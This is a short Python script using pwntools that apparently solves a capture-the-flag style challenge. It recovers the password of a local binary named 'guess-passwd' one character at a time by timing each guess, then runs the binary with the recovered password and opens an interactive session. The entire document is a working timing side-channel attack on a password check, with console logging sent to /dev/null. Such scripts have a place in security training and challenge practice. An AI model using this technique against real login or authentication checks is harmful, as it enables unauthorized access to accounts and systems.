from pwn import *
import time
context.log_console=open('/dev/null', 'w')
context.log_file=open('/dev/null', 'w')

moveset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd = ""

best_diff = .02
for i in range(0, 19):
    ans = "a"
    for move in moveset:
        teststr = passwd + move
        p = process('./guess-passwd')
        data = p.recv()
        t1 = time.time()
        p.sendline(teststr)
        data = p.recv()
        t2 = time.time()
        diff = t2 - t1
        p.close()
        if diff > best_diff:
            best_diff = best_diff + .02
            ans = move
            break
        print(move + ": " + str(diff))
    passwd = passwd + ans
print(passwd)

# Launch processs
p = process('./guess-passwd')
p.sendline(passwd)

p.interactive()
